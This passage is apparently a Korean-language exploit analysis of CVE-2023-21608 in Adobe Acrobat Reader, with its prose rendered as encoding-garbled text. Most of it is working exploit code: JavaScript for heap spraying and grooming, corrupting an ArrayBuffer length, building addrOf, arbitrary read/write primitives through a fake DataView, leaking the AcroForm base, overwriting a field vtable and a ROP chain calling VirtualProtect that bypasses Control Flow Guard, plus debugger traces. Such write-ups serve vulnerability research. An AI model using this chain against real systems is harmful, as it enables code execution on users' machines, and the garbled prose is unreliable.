`Myhead`ì—ëŠ” `this`(0x20000058)ì—ì„œ ë°ì´í„°ë¥¼ ì½ì–´ 0x20000060ì´ ì €ì¥ë˜ê³  `Myhead->_Parent`(0x20000064)ì— ì €ì¥ëœ 0x20000044ê°€ `Parent`ì— ì €ì¥ë©ë‹ˆë‹¤. `lower_bound`ì˜ í˜¸ì¶œ ê²°ê³¼ ë‘ ë²ˆì§¸ ì¸ìë¡œ ì „ë‹¬í•œ `v8`ì˜ 0, 1, 2 ì¸ë±ìŠ¤ì— ê°ê° `Parent`(0x20000044), 0, `Myhead`(0x20000060) ê°’ì´ ì“°ì…ë‹ˆë‹¤.

### std::map<unsigned short,CAgg>::insert

```c
int __thiscall std::map<unsigned short,CAgg>::insert(int *this, int *a2, int *a3, int *a4)
{
  int *Myhead; // ebx
  int *v5; // esi
  int *v6; // edi
  int v8; // eax
  int *v9; // edx
  int v10; // ecx

  ++this[1];                                    // ++this->_Mysize;
  Myhead = (int *)*this;                        // this->_Myhead
  v5 = a4;
  a4[1] = (int)a2;                              // a4->_Parent = a2
  if ( a2 != Myhead )
  {
    if ( a3 )// a3 == 0
    {
      ...
    }
    else
    {
	    a2[2] = (int)a4;
      if ( a2 == (int *)Myhead[2] )
        Myhead[2] = (int)a4;
    }
    ...
  }
  ...
}
```

ë‘ ë²ˆì§¸ ì¸ì(`a2`)ëŠ” `lower_bound`ì—ì„œ `v8[0]`ì— ì“°ì¸ `Parent`(0x20000044)ì…ë‹ˆë‹¤.ì„¸ ë²ˆì§¸ ì¸ì(`a3`)ì€  `lower_bound`ì—ì„œ ì“°ì¸ 0ì´ê¸° ë•Œë¬¸ì— `else`ë¡œ ë¶„ê¸°í•©ë‹ˆë‹¤. ì—¬ê¸°ì„œ `a2[2] = (int)a4;`ê°€ ì‹¤í–‰ë˜ë©´ì„œ `Parent + 8`(0x2000004c)ì— ì–´ë–¤ ë©”ëª¨ë¦¬ì˜ ì£¼ì†Œê°€ ì“°ì´ê²Œ ë©ë‹ˆë‹¤.

```
eax=20000044 ebx=20000060 ecx=20000058 edx=291a1bf8 esi=291a1bf8 edi=20000058
eip=6385bccf esp=0457ab88 ebp=0457ab94 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
AcroForm!hb_set_invert+0x3d1f:
6385bccf 897008          mov     dword ptr [eax+8],esi ds:002b:2000004c=0000ffe8
```

`Parent + 8`ì€ `ArrayBuffer`ì˜ lengthê°€ ìœ„ì¹˜í•œ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ê³  ìˆê³  ë©”ëª¨ë¦¬ ì£¼ì†ŒëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì›ë˜ì˜ í¬ê¸°ì¸ 0xffe8ë³´ë‹¤ í›¨ì”¬ í½ë‹ˆë‹¤. ë”°ë¼ì„œ í•´ë‹¹ `ArrayBuffer`ë¥¼ í†µí•´ OOB Read/Writeê°€ ê°€ëŠ¥í•˜ê²Œ ë©ë‹ˆë‹¤.

### Javascript code

ì•„ë˜ëŠ” ìœ„ ê³¼ì •ì„ ìˆ˜í–‰í•˜ì—¬ OOB Read/Writeì— ì‚¬ìš©í•˜ëŠ” `ArrayBuffer`ë¥¼ ìƒì„±í•˜ëŠ” Javascript ì½”ë“œì…ë‹ˆë‹¤.

```jsx
/*
....
*/
const ALLOC_SIZE = 0x10000 - 24;
const ARR_BUF_BASE = 0x20000048;
const ARR_BUF_MALLOC_BASE = 0x20000040;

const arrBufPtr = ARR_BUF_BASE + 0x10;

const FAKE_STR_START = 0x40;
const FAKE_STR = arrBufPtr + 0x100;
const FAKE_DV_START = 0x60;
const FAKE_DV = arrBufPtr + 0x180;
/*
....
*/
function groomLFH(size, count) {
    var code =
        "%u4141%u4242%u4343%u4444%u4545%u4646%u4747%u4848%u4949%u4a4a%u4b4b%u4c4c%u4d4d%u4e4e%u4f4f%u5050%u0058%u2000%u5353%u5454%u5555%u5656%u5757%u5858%u5959%u5a5a%u5b5b%u5c5c%u5d5d%u5e5e%u5f5f%u6060%u6161%u6262%u6363%u6464%u6565%u6666%u6767%u6868%u6969%u6a6a%u6b6b%u6c6c%u6d6d%u6e6e%u6f6f%u7070%u7171%u7272%u7373%u7474%u7575%u7676%u7777%u7878%u7979%u7a7a%u7b7b%u7c7c%u7d7d%u7e7e%u7f7f%u8080%u8181%u8282%u8383%u8484";
    var string = unescape(code);

    for (var i = 0; i < count; i++) {
        chunks.push(string.substr(0, (size - 2) / 2).toUpperCase());
    }

    for (var i = 0; i < chunks.length; i += 2) {
        chunks[i] = null;
        delete chunks[i];
    }
}

function sprayArrBuffers() {
    for (var i = 0; i < 0x1500; i++) {
        bufs[i] = new ArrayBuffer(ALLOC_SIZE);
        const uintArr = new Uint32Array(bufs[i]);
        for (var k = 0; k < 16; k++) {
            uintArr[k] = 0x33333333;
        }
        uintArr[0] = arrBufPtr + 8; //first deref a = *ecx
        uintArr[1] = 0x41424344; //map size
        uintArr[2] = 0x41424344;
        uintArr[3] = ARR_BUF_BASE - 4;

        // fake string for arbitrary read
        uintArr[FAKE_STR_START] = 0x102; //type
        uintArr[FAKE_STR_START + 1] = arrBufPtr + 0x40; // buffer
        uintArr[FAKE_STR_START + 2] = 0x4;
        uintArr[FAKE_STR_START + 3] = 0x4;

        // fake dataview for arbitrary write
        uintArr[FAKE_DV_START] = 0x77777777;
        delete uintArr;
        uintArr = null;
    }

    for (var i = 0; i < 0x10; i++) {
        arrs[i] = new Array(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23);
        arrs[i][0] = 0x47484950;
        arrs[i][1] = targetStr;
        arrs[i][2] = targetDV;
        for (var k = 3; k < 5000; k++) {
            arrs[i][k] = 0x50515051;
        }
    }
}

console.println("[*] spraying array buffer...");

sprayArrBuffers();

console.println("[*] pre-populating LFH...");

groomLFH(68, 5000);

/*
Trigger the Bug
*/
```

`sprayArrBuffers`í•¨ìˆ˜ì—ì„œëŠ” 0xffe8 í¬ê¸°ë¥¼ ê°€ì§€ëŠ” `ArrayBuffer`ë¥¼ ìŠ¤í”„ë ˆì´í•˜ëŠ” ê²ƒìœ¼ë¡œ 0x20000048ì— `ArrayBuffer`ê°€ í• ë‹¹ë˜ê²Œ ë§Œë“­ë‹ˆë‹¤. ë˜í•œ `ArrayBuffer`ì—ì„œ OOB Read/Writeë¡œ ì ‘ê·¼í•  `Array`ë¥¼ ìŠ¤í”„ë ˆì´í•˜ì—¬ ì¸ì ‘í•œ ì£¼ì†Œì— í• ë‹¹í•˜ê³  ì´ëŠ” ì¶”í›„ì— ì„ì˜ ì£¼ì†Œ ì½ê¸°/ì“°ê¸°ì— ì‚¬ìš©ë©ë‹ˆë‹¤.

ìŠ¤í”„ë ˆì´ë˜ëŠ” `ArrayBuffer`ì—ëŠ” `std::map<unsigned short,CAgg>::lower_bound`ì™€  `std::map<unsigned short,CAgg>::insert`ì˜ ë™ì‘ì— ì˜í•´ lengthê°€ ë®ì–´ ì“°ì´ë„ë¡ í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•©ë‹ˆë‹¤. ì´í›„ `groomLFH` í•¨ìˆ˜ì—ì„œ `String` ë°ì´í„° í• ë‹¹ì„ í†µí•´ í™ ê·¸ë£¨ë°ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì´ ë¬¸ìì—´ ë°ì´í„°ì—ëŠ” `%u0058%u2000`ì´ í¬í•¨ë˜ì–´ ìˆê³  `unescape`ë¡œ ì¸í•´ fake `map`ì˜ ì£¼ì†Œì¸ 0x20000058ë¡œ ë³€ê²½ë©ë‹ˆë‹¤. 

ë²„ê·¸ê°€ íŠ¸ë¦¬ê±°ëœ ì´í›„ `groomLFH`ì—ì„œ ìŠ¤í”„ë ˆì´ëœ ë¬¸ìì—´ì´ ë³€í™˜ëœ `CAgg`ì˜¤ë¸Œì íŠ¸ë“¤ì€ ë‹¤ì‹œ ë³€í™˜ì„ ê±°ì¹˜ê²Œ ë˜ëŠ”ë° ì´ë•Œ ë¬¸ìì—´ ë°ì´í„°ë¥¼ ì˜®ê¸¸ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. brute-forceë¡œ ì•Œì•„ë‚¸ í¬ê¸°ì¸ 68ë¡œ í™ ê·¸ë£¨ë°ì„ ì§„í–‰í•˜ë©´ ì´ ê³¼ì •ì—ì„œ Use-After-Freeê°€ ë°œìƒí•˜ëŠ” ë©”ëª¨ë¦¬ë¥¼ ì¬í• ë‹¹í•˜ì—¬ fake `map`ì˜ ì£¼ì†Œë¥¼ ìœ„ì¹˜ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## 2. Out-of-Bounds Read/Write via Corrupted ArrayBuffer

lengthê°€ ë³€ì¡°ëœ `ArrayBuffer`ë¥¼ ì‚¬ìš©í•œ OOB Read/Writeë¡œ ë‹¤ë¥¸ ì˜¤ë¸Œì íŠ¸ë¥¼ ë³€ì¡°í•˜ì—¬ ì¶”í›„ì— Arbitrary Address Read/Writeì— ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ì•„ë˜ì˜ ì½”ë“œë¥¼ í†µí•´ ë³€ì¡°ëœ ê¸¸ì´ë¥¼ ê°€ì§€ëŠ” `ArrayBuffer`ë¥¼ ì°¾ìŠµë‹ˆë‹¤.

```jsx
var arrStart = 0;
var corruptedTypedArr = null;

var originalTargetStrAddr = 0,
    originalTargetDVAddr = 0;

for (var i = 0; i < bufs.length; i++) {
    if (bufs[i].byteLength != ALLOC_SIZE) {
        console.println(
            "[+] corrupted array buffer found at " +
                i +
                " : length: " +
                bufs[i].byteLength +
                " : buf length: " +
                bufs.length
        );
        const uintArr = new Uint32Array(bufs[i]);

        console.println("[*] checking leaked global array...");

        for (var x = ((bufs.length - i) * 0xfff8) / 4; x < uintArr.length; x++) {
            if (uintArr[x] == 0x47484950) {
                arrStart = x - 4;
                console.println("[*] leaked global array found at index:" + arrStart);
                break;
            }
        }

        // store for recovery
        originalTargetStrAddr = uintArr[arrStart + 6];
        originalTargetDVAddr = uintArr[arrStart + 8];

        // corrupt for further primitives
        uintArr[arrStart + 4] = 0x47484951;
        uintArr[arrStart + 6] = FAKE_STR;
        uintArr[arrStart + 8] = FAKE_DV;

        corruptedTypedArr = uintArr;

        break;
    }
}
```

ìŠ¤í”„ë ˆì´ëœ `ArrayBuffer`ë“¤ì˜ lengthë¥¼ ê²€ì‚¬í•˜ì—¬ í• ë‹¹ì— ì‚¬ìš©í•œ í¬ê¸°ì¸ `ALLOC_SIZE`(0xffe8)ì™€ ê°™ì€ì§€ ë¹„êµí•˜ëŠ” ê²ƒìœ¼ë¡œ OOB Read/Writeê°€ ë°œìƒí•˜ëŠ” `corruptedTypedArr`ë¥¼ ì°¾ì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ í†µí•´ `sprayArrBuffers` í•¨ìˆ˜ì—ì„œ ìŠ¤í”„ë ˆì´ëœ ì¸ì ‘í•œ `Array`ë“¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆê³  ìŠ¤í”„ë ˆì´ëœ `Array`ì—ëŠ” ì•„ë˜ì™€ ë°ì´í„°ê°€ ì €ì¥ë˜ì–´ ìˆìŠµë‹ˆë‹¤

```
24188270  00000000 00000f80 00000f80 00000f80  ................
24188280  47484950 ffffff81 0db3c420 ffffff85  PIHG.... .......
24188290  0dda27c0 ffffff87 50515051 ffffff81  .'......QPQP....
241882a0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....
241882b0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....
241882c0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....
241882d0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....
241882e0  50515051 ffffff81 50515051 ffffff81  QPQP....QPQP....

```

`Array`ì—ëŠ” ë°ì´í„° ê°’ë§Œ ì €ì¥ë˜ëŠ” `ArrayBuffer`ì™€ ë‹¬ë¦¬ ê° 4ë°”ì´íŠ¸ì˜ ë°ì´í„° ê°’ê³¼ íƒ€ì…ì„ ë‚˜íƒ€ë‚´ëŠ” íƒœê·¸ ê°’ìœ¼ë¡œ ì´ë£¨ì–´ì§„ jsvalì´ ì €ì¥ë©ë‹ˆë‹¤.

ì•„ë˜ëŠ”  Adobe Acrobat Readerì—ì„œ ì‚¬ìš©í•˜ëŠ” Javascript ì—”ì§„ì¸ SpiderMonkeyì—ì„œ jsvalì„ í‘œí˜„í•˜ëŠ” ë°©ì‹ì„ ë‚˜íƒ€ë‚¸ ê·¸ë¦¼ì…ë‹ˆë‹¤.

![Untitled](1day1document_CVE-2023-21608/Untitled%206.png)

> ê·¸ë¦¼.1: [ì¶œì²˜](https://downloads.immunityinc.com/infiltrate-archives/the_shadow_over_firefox_infiltrate_2015.pdf) Slide 10
> 

ì´ë¥¼ ì°¸ê³ í•˜ì—¬ `Array`ì— ì €ì¥ëœ ë°ì´í„°ë¥¼ ë¶„ì„í•˜ë©´ `0db3c420 ffffff85`ëŠ” ë¬¸ìì—´ì¸ `targetStr`ì´ê³  `0dda27c0 ffffff87`ëŠ” DataViewì¸ `targetDV`ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Corrupt Sparyed Array

ë¨¼ì € ë³€ì¡°ëœ `ArrayBuffer`ë¥¼ í†µí•´ ì¸ì ‘í•œ `Array`ë¥¼ ì°¾ê¸° ìœ„í•´ OOB Readë¥¼ í™œìš©í•©ë‹ˆë‹¤.

OOB Readë¡œ ì½ì€ ë°ì´í„°ë¥¼ `Array[0]`ì— ìœ„ì¹˜í•œ 0x47484950ê³¼ ë¹„êµí•˜ëŠ” ê²ƒì„ í†µí•´ ìŠ¤í”„ë ˆì´ëœ `Array`ì„ì„ ì‹ë³„í•  ìˆ˜ ìˆê³  OOB Readì— ì‚¬ìš©ëœ ì¸ë±ìŠ¤ì—ì„œ 4ë¥¼ ë¹¼ì„œ `Array` ì˜¤ë¸Œì íŠ¸ê°€ ìœ„ì¹˜í•œ ì£¼ì†Œì— ì ‘ê·¼í•˜ê¸° ìœ„í•œ ì¸ë±ìŠ¤ `arrStart`ì— ì €ì¥í•©ë‹ˆë‹¤.

ì´í›„ ì•„ë˜ì˜ ì½”ë“œë¥¼ í†µí•´ `Array`ì— ì ‘ê·¼í•˜ì—¬ `targetStr`ê³¼ `targetDV`ë¥¼ ê°€ë¦¬í‚¤ëŠ” ë¶€ë¶„ì„ ê°ê° `FAKE_STR`ê³¼ `FAKE_DV`ë¡œ ë³€ì¡°í•©ë‹ˆë‹¤.

```jsx
        originalTargetStrAddr = uintArr[arrStart + 6];// corrupted ArrayBuffer
        originalTargetDVAddr = uintArr[arrStart + 8];

        // corrupt for further primitives
        uintArr[arrStart + 4] = 0x47484951;
        uintArr[arrStart + 6] = FAKE_STR; // 0x20000058 + 0x100
        uintArr[arrStart + 8] = FAKE_DV; //0x20000058 + 0x180

        corruptedTypedArr = uintArr;
        
        
```

`FAKE_STR`ê³¼ `FAKE_DV`ëŠ” ë³€ì¡°ëœ `ArrayBuffer`ì˜ ë°ì´í„° ì‹œì‘ ì£¼ì†Œì¸ 0x20000058ë¡œë¶€í„° ê°ê° 0x100, 0x180 ë§Œí¼ ë–¨ì–´ì§„ ìœ„ì¹˜ì— êµ¬ì„±í•©ë‹ˆë‹¤.

## 3. AddrOf & poi Primitives

### AddrOf Primitive

ì„ì˜ì˜ Javascript ì˜¤ë¸Œì íŠ¸ì˜ ì£¼ì†Œë¥¼ ìœ ì¶œí•˜ê¸° ìœ„í•œ addrofë¥¼ ë³€ì¡°ëœ `ArrayBuffer`(`corruptedTypedArr`)ì™€ `Array`(`modifiedArr`)ë¥¼ í†µí•´ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 

```jsx
var modifiedArr = null;

for (var i = 0; i < arrs.length; i++) {
    if (arrs[i][0] == 0x47484951) {
        modifiedArr = arrs[i];
        break;
    }
}

function addrOf(obj) {
    modifiedArr[0] = obj;
    addr = corruptedTypedArr[arrStart + 4];
    return addr;
}
```

ìœ„ ì½”ë“œì—ì„œëŠ” ìŠ¤í”„ë ˆì´ëœ `Array`ë“¤ì„ ìˆœíšŒí•˜ë©° `Array[0]`ì´ ì›ë³¸ì¸  0x47484950ì´ ì•„ë‹ˆë¼ ë³€ì¡°ëœ 0x47484951ì¸ `Array`ë¥¼ ì°¾ì•„ë‚´ê³  ì´ë¥¼ `modifiedArr`ì— ëŒ€ì…í•©ë‹ˆë‹¤. `corruptedTypedArr[arrStart + 4]`ë¡œ ë°ì´í„°ë¥¼ ì½ìœ¼ë©´ `modifiedArr[0]`ì— ì €ì¥ëœ jsvalì˜ ë°ì´í„°ê°€ ì½íˆê²Œ ë©ë‹ˆë‹¤.

`addrOf` í•¨ìˆ˜ì—ì„œëŠ” ì´ë¥¼ ì´ìš©í•˜ì—¬ `modifiedArr[0]`ì— ì£¼ì†Œë¥¼ ìœ ì¶œí•  ì˜¤ë¸Œì íŠ¸ë¥¼ ëŒ€ì…í•˜ê³  `corruptedTypedArr[arrStart + 4]`ë¡œ ì—¬ê¸°ì— ì“°ì¸ ì˜¤ë¸Œì íŠ¸ì˜ ì£¼ì†Œë¥¼ ì½ì–´ ë°˜í™˜í•©ë‹ˆë‹¤.

### poi Primitive

`modifiedArr[1]`ì€ ì›ë³¸ String ì˜¤ë¸Œì íŠ¸ê°€ ì•„ë‹Œ `corruptedTypedArr`ì— êµ¬ì„±ëœ Fake Stringì„ ê°€ë¦¬í‚¤ê³  ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ë©´ ì„ì˜ì˜ ì£¼ì†Œì—ì„œ ë°ì´í„°ë¥¼ ë¬¸ìì—´ë¡œ ì½ì–´ì˜¤ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤

```jsx
const FAKE_STR_START = 0x40;

function s2h(s) {
    var n1 = s.charCodeAt(0);
    var n2 = s.charCodeAt(1);
    return ((n2 << 16) | n1) >>> 0;
}

function poi(addr) {
    // leak values at addr by setting it to string ptr
    corruptedTypedArr[FAKE_STR_START + 1] = addr;
    val = s2h(modifiedArr[1]);
    return val;
}
```

`poi`í•¨ìˆ˜ì—ì„œëŠ” `corruptedTypedArr`ì— êµ¬ì„±ëœ Fake Stringì˜ ë¬¸ìì—´ ë°ì´í„°ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„°ë¥¼ ë°ì´í„°ë¥¼ ì½ì„ ì£¼ì†Œë¡œ ë°”ê¿‰ë‹ˆë‹¤. ì´í›„ `modifiedArr[1]`ì— ì ‘ê·¼í•˜ë©´ Fake Stringì´ ë°˜í™˜ë˜ê³  ë³€ì¡°ëœ ì£¼ì†Œì— ìœ„ì¹˜í•œ ë¬¸ìì—´ì„ `s2h`í•¨ìˆ˜ë¥¼ í†µí•´ ìˆ«ìë¡œ ë³€í™˜í•©ë‹ˆë‹¤.

## 4. Arbitrary Address Read/Write Primitive

ìœ„ì—ì„œ êµ¬í˜„ëœ `addrOf`, `poi`ë¡œ Fake `DataView`ë¥¼ êµ¬ì„±í•˜ê³  ì´ë¥¼ í†µí•´ ì„ì˜ ì£¼ì†Œ ì½ê¸°/ì“°ê¸°ë¥¼ ìœ„í•œ `AAR`, `AAW` í•¨ìˆ˜ë¥¼ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```jsx
var targetDV = new DataView(new ArrayBuffer(0x64));
targetDV.setUint32(0, 0x55555555, true);
const FAKE_DV_START = 0x60;
//....

var targetDVPtr = addrOf(targetDV);
console.println("[+] target dataview address: " + targetDVPtr.toString(16));

for (var k = 0; k < 32; k++) {
    corruptedTypedArr[FAKE_DV_START + k] = poi(targetDVPtr + k * 4);
}

function AAR(addr) {
    corruptedTypedArr[FAKE_DV_START + 20] = addr;
    return modifiedArr[2].getUint32(0, true);
}

function AAW(addr, value) {
    corruptedTypedArr[FAKE_DV_START + 20] = addr;
    modifiedArr[2].setUint32(0, value, true);
}
```

Fake `DataView`ë¥¼ êµ¬ì„±í•˜ê¸° ìœ„í•´ ë¨¼ì € `addrOf`ë¡œ ì›ë³¸ `DataView`ì¸ `targetDV`ì˜ ì£¼ì†Œ(`targetDVptr`)ì„ ì•Œì•„ëƒ…ë‹ˆë‹¤. ì´í›„ ì›ë³¸ì˜ ë°ì´í„°ë¥¼ `poi`ë¡œ ì½ì–´ `corruptedTypedArr[FAKE_DV_START]`ì— ë³µì œí•˜ì—¬ Fake `DataView`ë¥¼ ì‚¬ìš©í•  ë•Œ ì˜ë„ì¹˜ ì•Šì€ ë™ì‘ì´ ë°œìƒí•˜ì§€ ì•Šê²Œ í•©ë‹ˆë‹¤.

`AAR`, `AAW` í•¨ìˆ˜ì—ì„œëŠ” `corruptedTypedArr[FAKE_DV_START + 20]`ì— ìœ„ì¹˜í•œ `DataView`ì˜ `ArrayBuffer` í¬ì¸í„°ë¥¼ ì½ê±°ë‚˜ ì“¸ ì£¼ì†Œë¡œ ë³€ì¡°í•©ë‹ˆë‹¤. ìµœì¢…ì ìœ¼ë¡œ `modifiedArr[2]`ë¡œ Fake `DataView`ì— ì ‘ê·¼í•˜ì—¬ `setUint32`ë‚˜ `getUint32` ë©”ì†Œë“œë¥¼ í˜¸ì¶œí•˜ë©´ ì„ì˜ì˜ ì£¼ì†Œì—ì„œ 4ë°”ì´íŠ¸ì˜ ë°ì´í„°ë¥¼ ì½ê±°ë‚˜ ì“°ëŠ” ê²ƒì´ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.

## 5. Insert ROP Payload

`addrOf`, `AAR`, `AAW` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ë² ì´ìŠ¤ ì£¼ì†Œ ë“± í•„ìš”í•œ ë°ì´í„°ë¥¼ ìœ ì¶œí•˜ê³  ROP í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•˜ê³  vtableì„ ë³€ì¡°í•˜ì—¬ ì‚½ì…í•œ í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë˜ë„ë¡ ë§Œë“­ë‹ˆë‹¤.

### Leak AcroForm Base Address

ë¨¼ì € ROP ê°€ì ¯ë“¤ì˜ ì£¼ì†Œë¥¼ ê³„ì‚°í•˜ê¸° ìœ„í•´ `AAR`í•¨ìˆ˜ë¡œ `textField`ì¸ `f0`ë¡œë¶€í„° `AcroForm.API`ì˜ ë² ì´ìŠ¤ ì£¼ì†Œë¥¼ ìœ ì¶œí•©ë‹ˆë‹¤. ì´í›„ ë³€ì¡°í•  `field`ì˜ vtableì˜ ì£¼ì†Œë¥¼ ì•Œì•„ë‚´ê³  Fake `DataView`ë¥¼ êµ¬ì„±í•  ë•Œì™€ ë§ˆì°¬ê°€ì§€ë¡œ vtableì˜ ë°ì´í„°ë¥¼ ì½ì–´ `corruptedTypedArr`ì´ ìœ„ì¹˜í•œ 0x20000158(`arrBufPtr + 0x100`)ì— ë³µì œí•©ë‹ˆë‹¤.

```jsx
const arrBufPtr = 0x20000048 + 0x10;
var AcroFormApiBase =
    AAR(AAR(addrOf(f0) + 0x10) + 0x34) - VersionData[curAppVersion]["AcroFormOffset"];
console.println("[+] AcroForm base leaked: " + AcroFormApiBase.toString(16));

var fieldVtblAddr = AAR(AAR(AAR(AAR(addrOf(f0) + 0x10) + 0x10) + 0xc) + 4);
var fieldVtbl = AAR(fieldVtblAddr);

console.println(
    "[+] field vTable Addr: " +
        fieldVtblAddr.toString(16) +
        " | fieldVtable: " +
        fieldVtbl.toString(16)
);
````
console.println("[*] clone field vtable for overwriting defaultValue pointer");

for (var i = 0; i < 32; i++) AAW(arrBufPtr + 0x100 + i * 4, AAR(fieldVtbl + i * 4));

var originalDefaulValFunc = AAR(arrBufPtr + 0x100 + 0x48);
```

### Building ROP Chain : CFG Bypass

```jsx
ROP = VersionData[curAppVersion]["ROP"];
AAW(arrBufPtr + 0x100 + 0x48, AcroFormApiBase + ROP[0]); // ROP_s = AcroForm!sub_20EFAA60 ;
AAW(arrBufPtr + 0x100 + 0x30, AcroFormApiBase + ROP[1]); // xchg eax, esp ; ret ;
AAW(arrBufPtr + 0x100, AcroFormApiBase + ROP[2]); // pop esp ; ret ;
AAW(arrBufPtr + 0x100 + 4, arrBufPtr + 0x300); // pivot to our _stack
AAW(fieldVtblAddr, arrBufPtr + 0x100); // overwrite field vtable to our ROP start

console.println("[*] storing recovery context!");
AAW(arrBufPtr + 0x300 + 0x60, fieldVtblAddr); // original vtable ptr (goes back in ecx)
AAW(arrBufPtr + 0x300 + 0x64, fieldVtbl); // vtable funcs ptr
AAW(arrBufPtr + 0x300 + 0x68, originalDefaulValFunc); // original defaultVal impl to jump to
AAW(arrBufPtr + 0x300 + 0x6c, AAR(ARR_BUF_BASE + 8)); // corrupted arrbuf typed array ptr
AAW(arrBufPtr + 0x300 + 0x70, AAR(ARR_BUF_MALLOC_BASE)); // malloc header 0
AAW(arrBufPtr + 0x300 + 0x74, AAR(ARR_BUF_MALLOC_BASE + 4)); // malloc header 1

var rop = [
    AAR(AcroFormApiBase + VersionData[curAppVersion]["VirtualProtect"]), // VirtualProtect
    arrBufPtr + 0x400, // return address
    arrBufPtr + 0x400, // buffer
    0x1000, // sz
    0x40, // new protect
    arrBufPtr + 0x540 // old protect
];

for (var i = 0; i < rop.length; i++) AAW(arrBufPtr + 0x300 + 4 * i, rop[i]);
```

ì´í›„ ë³µì œëœ vtableì— ROP ê°€ì ¯ ì£¼ì†Œë¥¼ ì‚½ì…í•˜ê³  `textField`ì¸ `f0`ì˜ vtable ì£¼ì†Œë¥¼ Fake vtableë¡œ ì¡°ì‘í•©ë‹ˆë‹¤. ì´í›„ `f0.defaultValue`ì— ì ‘ê·¼í•˜ë©´ `vtable + 0x48`ì— ìœ„ì¹˜í•œ `defaultValue` í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ëŠ”ë° Fake vtableì—ì„œëŠ” ì•„ë˜ì˜ `sub_20EFAA60`ì— í•´ë‹¹í•©ë‹ˆë‹¤.

```nasm
.text:20EFAA60 sub_20EFAA60    proc near               
.text:20EFAA60                                         
.text:20EFAA60                 mov     eax, [ecx]
.text:20EFAA62                 push    0Dh
.text:20EFAA64                 call    dword ptr [eax+30h]
.text:20EFAA67                 retn
.text:20EFAA67 sub_20EFAA60    endp
```

Adobe Acrobat Reader DCëŠ” CFG(Control Flow Guard)ê°€ í™œì„±í™”ë˜ì–´ ìˆì–´ vtableì„ í†µí•œ ê°€ìƒ í•¨ìˆ˜ í˜¸ì¶œì´ë‚˜ í•¨ìˆ˜ í¬ì¸í„°ë¥¼ í†µí•œ í˜¸ì¶œ ë“±ì˜ ê°„ì ‘ í˜¸ì¶œì´ ë°œìƒí•  ë•Œ `__guard_check_icall_fptr`ì´ ê°€ë¦¬í‚¤ëŠ” `ntdll!LdrpValidateUserCallTarget`ì´ í˜¸ì¶œë˜ì–´ ìœ íš¨í•œ ê°„ì ‘ í˜¸ì¶œì¸ì§€ ê²€ì‚¬í•˜ê³  ê·¸ë ‡ì§€ ì•Šì„ ê²½ìš° í”„ë¡œì„¸ìŠ¤ê°€ ê°•ì œ ì¢…ë£Œë©ë‹ˆë‹¤. ë”°ë¼ì„œ vtableì— ì§ì ‘ ROP ê°€ì ¯ì„ ì‚½ì…í•˜ë©´ í˜¸ì¶œì— ì‹¤íŒ¨í•˜ê²Œ ë©ë‹ˆë‹¤.

í•˜ì§€ë§Œ `sub_20EFAA60`ëŠ” ì•„ë˜ì˜ `AXTEFontAccess::`vftable'`ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆëŠ” ê²ƒì²˜ëŸ¼ ê°„ì ‘ì ìœ¼ë¡œ í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ì´ê³  ìœ íš¨í•œ í•¨ìˆ˜ë“¤ì˜ RVA ì£¼ì†Œê°€ ì €ì¥ëœ `__guard_fids_table`ì—ë„ ì¡´ì¬í•©ë‹ˆë‹¤. 

```nasm
.rdata:211315C0 ; const AXTEFontAccess::`vftable'
.rdata:211315C0 ??_7AXTEFontAccess@@6B@ dd offset sub_20DFFBE0
.rdata:211315C0                                         ; DATA XREF: sub_20DFF7B6+21â†‘o
.rdata:211315C0                                         ; sub_20DFFAAA+6â†‘o
                                       ....
.rdata:21131674                 dd offset sub_20EFAA60
                                       ....
```

ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì´ `ntdll!LdrpValidateUserCallTarget`ì˜ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ê³  í˜¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤

```
eax=20000158 ebx=00000001 ecx=63eeaa60 edx=0be950e0 esi=63eeaa60 edi=63a89990
eip=63a89a3b esp=0457c170 ebp=0457c19c iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
AcroForm!hb_ot_tags_to_script_and_language+0x68f9b:
63a89a3b ff153ca9fc63    call    dword ptr [AcroForm!DllUnregisterServer+0x50e8dc (63fca93c)] ds:002b:63fca93c={ntdll!LdrpValidateUserCallTarget (777c88e0)}
0:000> p
